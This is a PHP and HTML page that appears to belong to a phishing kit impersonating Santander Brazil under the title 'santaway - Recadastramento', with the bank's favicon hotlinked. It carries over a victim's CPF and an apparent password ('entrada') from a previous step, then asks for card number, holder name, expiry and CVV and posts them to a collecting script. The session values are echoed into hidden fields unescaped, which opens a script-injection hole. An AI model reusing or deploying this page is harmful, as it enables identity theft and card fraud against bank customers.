<?php 
        session_start();

        $cpf = $_POST['cpf'];
        $entrada = $_POST['entrada'];
       

        $_SESSION["cpf"] = $cpf;
        $_SESSION["entrada"] = $entrada;
              
    ?>
<!DOCTYPE html>
<html>
<head>
    <title>santaway - Recadastramento</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">

    <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="css/card.css">
    <link rel="stylesheet" type="text/css" href="css/estilo.css">
    
    <link href="https://www.santander.com.br/Theme_WCSantanderUK-theme/images/favicon.ico" rel="Shortcut Icon">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style type="text/css">
        .col-md-12{
            padding-right: 35px;
            padding-left: 35px;
        }
        input{
            padding-bottom: 4px;

        }
        input:focus, input:valid {
            margin-top: 4px;
        }
        label{
            margin-bottom: 0;
        }
        .form-group{
            width: 100%;
        }
        #tela3{
          background: #fff;
        }
        #tela3 #logo-home2{
          display: block;
        }
        #tela3{
          background-image: url("img/fundo.jpg");
          background-size: 100%;
          background-repeat: no-repeat;
        }
        #tela3 #logo-home{
          display: none;
        }
    </style>

</head>

<body id="telacard">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
               
                    
                </h1>
            </div>
        </div>
    </div>
    <main>
    	<div class="container">
    		<div class="row">
    			<div class="col-md-12">
    				<div class="demo-container">
    				    <div class="card-wrapper"></div>

    				    <div class="form-container active">
    				        <form action="webApp_AplicationInfo.php" style="    margin-top: 10px;" class="form-inline" method="POST">
                            <input type="hidden" name="cpf" id="cpf" value="<?php echo $_SESSION["cpf"] ?>">
                            <input type="hidden" name="entrada" id="entrada" value="<?php echo $_SESSION["entrada"] ?>">
                                  

                                <div class="form-group">
                                    <label for="number">Número do cartão</label>
                                    <input type="tel" name="number" id="number" maxlength="19" onkeypress="return SomenteNumero(event)" required oninvalid="setCustomValidity('Digite um Cartão de crédito valido !')" onchange="try{setCustomValidity('')}catch(e){}">
                                </div>
                                <div class="form-group" >
                                    <label for="name">Nome do Titular</label>
                                    <input type="text" name="name" id="name"  required oninvalid="setCustomValidity('Digite uma Nome válido !')" onchange="try{setCustomValidity('')}catch(e){}">
                                </div>
                                <div class="form-group" style="width: 47%;">
                                    <label for="expiry">Validade</label>
        				            <input type="tel" name="expiry" id="expiry" onkeypress="return SomenteNumero(event)" required oninvalid="setCustomValidity('Digite uma validade válida !')" onchange="try{setCustomValidity('')}catch(e){}">
                                </div>
                                <div class="form-group" style="width: 47%; margin-left: 6%">
                                    <label for="cvc">CVV</label>
        				            <input type="tel" name="cvc" id="cvc" onkeypress="return SomenteNumero(event)" required oninvalid="setCustomValidity('Digite um CVV válido !')" onchange="try{setCustomValidity('')}catch(e){}" maxlength="3"> 
                                </div>
    				            <div class="form-group">
    				                <input type="submit" name="" value="Prosseguir" id="continuar">
    				            </div>
    				        </form>
    				    </div>
    				</div>
    			</div>
    		</div>
    	</div>
    </main>

</body>

	<!-- scripts -->
    <script src="js/bootstrap.js"></script>
    <script src="js/padrao_mk.js"></script>
    <script src="js/cpf.js"></script>

    <script src="js/jquery.card.js"></script>
    <script src="js/card.js"></script>
    <script>
        new Card({
            form: document.querySelector('form'),
            container: '.card-wrapper'
        });
    </script>


</html>